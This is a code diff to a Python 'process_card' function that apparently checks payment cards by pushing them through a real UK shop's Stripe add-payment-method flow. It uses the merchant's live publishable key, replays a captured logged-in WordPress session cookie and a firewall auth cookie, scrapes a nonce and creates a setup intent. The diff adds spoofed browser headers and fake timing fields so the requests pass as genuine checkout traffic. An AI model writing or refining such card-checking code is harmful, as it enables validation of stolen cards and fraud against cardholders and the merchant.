@@ -21,25 +21,38 @@ def process_card(ccx):
     
     user_agent = UserAgent().random
     
-    # Step 1: Create Payment Method
+    # Step 1: Create Payment Method with updated headers
     payment_data = {
         'type': 'card',
         'card[number]': n,
         'card[cvc]': cvc,
         'card[exp_year]': yy,
         'card[exp_month]': mm,
-        'billing_details[address][postal_code]': '10080',
+        'allow_redisplay': 'unspecified',
         'billing_details[address][country]': 'US',
-        'payment_user_agent': 'stripe.js/e15cb9c2d4; stripe-js-v3/e15cb9c2d4',
+        'pasted_fields': 'number',
+        'payment_user_agent': 'stripe.js/63a7a7cd5b; stripe-js-v3/63a7a7cd5b; payment-element; deferred-intent',
         'referrer': 'https://quiltedbear.co.uk',
+        'time_on_page': '184060',
         'key': 'pk_live_90o1zSEv0cxulJp2q9wFbksO',
+        '_stripe_version': '2024-06-20'
     }
     
     try:
         pm_response = requests.post(
             'https://api.stripe.com/v1/payment_methods',
             data=payment_data,
-            headers={'User-Agent': user_agent}
+            headers={
+                'User-Agent': user_agent,
+                'accept': 'application/json',
+                'accept-language': 'en-US,en;q=0.9,pt;q=0.8',
+                'content-type': 'application/x-www-form-urlencoded',
+                'origin': 'https://js.stripe.com',
+                'referer': 'https://js.stripe.com/',
+                'sec-ch-ua': '"Google Chrome";v="137", "Chromium";v="137", "Not/A)Brand";v="24"',
+                'sec-ch-ua-mobile': '?0',
+                'sec-ch-ua-platform': '"Windows"'
+            }
         )
         pm_data = pm_response.json()
         
@@ -59,16 +72,36 @@ def process_card(ccx):
             "status": "Declined"
         }
 
-    # Step 2: Get Nonce
+    # Step 2: Get Nonce with updated cookies
+    cookies = {
+        'sbjs_migrations': '1418474375998%3D1',
+        'sbjs_current_add': 'fd%3D2025-06-11%2004%3A21%3A51%7C%7C%7Cep%3Dhttps%3A%2F%2Fquiltedbear.co.uk%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3D%28none%29',
+        'sbjs_first_add': 'fd%3D2025-06-11%2004%3A21%3A51%7C%7C%7Cep%3Dhttps%3A%2F%2Fquiltedbear.co.uk%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3D%28none%29',
+        'sbjs_current': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
+        'sbjs_first': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
+        'sbjs_udata': 'vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Windows%20NT%2010.0%3B%20Win64%3B%20x64%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F137.0.0.0%20Safari%2F537.36',
+        '_gid': 'GA1.3.183848283.1749617518',
+        '__stripe_mid': '4e631fe4-ffe8-4854-bcd4-8e3e77361778b70b5c',
+        '__stripe_sid': '43bc0b45-9905-4950-bf61-d2e653a1c2a140cfc1',
+        '_ga': 'GA1.3.2002075700.1749617516',
+        'wordpress_logged_in_ef6e1fd2910cd4b25b2e6fe479931581': 'teamff%7C1750827513%7C5etvp0CNjBGSOlZjh6Jq7jrBMGZavAybVOyTQOltpEO%7C395a136c3edf76d3993c84105b8cebeeb1432fb8b54e55933477d07c2002dba9',
+        'wfwaf-authcookie-590e6fc54133c4edd8ff840ed6e380f8': '98486%7Cother%7Cread%7C7bd3c26179687ad6428c082d39fe04732f03186d250b30e5f4912913293c3014',
+        '_ga_RSXCLFBHLB': 'GS2.1.s1749617516$o1$g1$t1749617907$j50$l0$h0',
+        'sbjs_session': 'pgs%3D5%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fquiltedbear.co.uk%2Fmy-account%2Fadd-payment-method%2F',
+    }
+    
     headers = {
         'User-Agent': user_agent,
         'Referer': 'https://quiltedbear.co.uk/my-account/add-payment-method/',
+        'accept': '*/*',
+        'accept-language': 'en-US,en;q=0.9,pt;q=0.8',
     }
     
     try:
         nonce_response = requests.get(
             'https://quiltedbear.co.uk/my-account/add-payment-method/',
-            headers=headers
+            headers=headers,
+            cookies=cookies
         )
         
         # Extract nonce from response
@@ -88,7 +121,7 @@ def process_card(ccx):
             "status": "Declined"
         }
 
-    # Step 3: Create Setup Intent
+    # Step 3: Create Setup Intent with updated params
     params = {'wc-ajax': 'wc_stripe_create_and_confirm_setup_intent'}
     data = {
         'action': 'create_and_confirm_setup_intent',
@@ -101,7 +134,16 @@ def process_card(ccx):
         setup_response = requests.post(
             'https://quiltedbear.co.uk/',
             params=params,
-            headers=headers,
+            headers={
+                'User-Agent': user_agent,
+                'Referer': 'https://quiltedbear.co.uk/my-account/add-payment-method/',
+                'accept': '*/*',
+                'accept-language': 'en-US,en;q=0.9,pt;q=0.8',
+                'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
+                'origin': 'https://quiltedbear.co.uk',
+                'x-requested-with': 'XMLHttpRequest',
+            },
+            cookies=cookies,
             data=data
         )
         setup_data = setup_response.json()
